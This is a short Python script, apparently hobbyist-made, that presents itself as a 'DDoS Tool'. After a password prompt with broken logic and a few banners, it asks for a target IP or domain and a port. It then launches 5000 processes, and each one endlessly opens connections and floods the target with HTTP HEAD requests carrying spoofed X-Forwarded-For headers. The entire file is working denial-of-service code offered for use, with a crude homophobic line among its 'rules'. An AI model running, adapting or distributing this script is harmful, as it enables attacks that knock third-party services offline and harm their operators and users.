import socket
import threading
from time import sleep
import datetime
import sys
import multiprocessing
import random
import os

def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
  
os.system(" figlet PASSWORD!!!")
print("DDoS Tool create by gx7gaming#7570")
while True:
  password = input("Enter the password : ")
  if password=="gx7gamingpro":
    print("correct")
  break
#password is gx7gamingpro
else:
  print("wrong password!!!")
#RULE!!!
os.system("clear")
os.system("figlet RULE!!!")
print("Dont abuse!!!")
print("Dont gay")
print("")
print("loading..................")
sleep(5)

os.system("clear")
os.system("figlet DDOS ATTACK")


print("#########################")
print("#.                      #")
print("#  Welcom To DDoS Tool  #")
print("#  Coder by : gx7gaming #")
print("#  DONT ABUSE!!!!       #")
print("#.                      #")
print("#########################")
print("")
print("")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
os.system("clear")
os.system("figlet DDOS ATTACK!!!")
print("")
print("[>>>] Starting The DDoS [<<<]")
sleep(1)

def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
    
    
def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()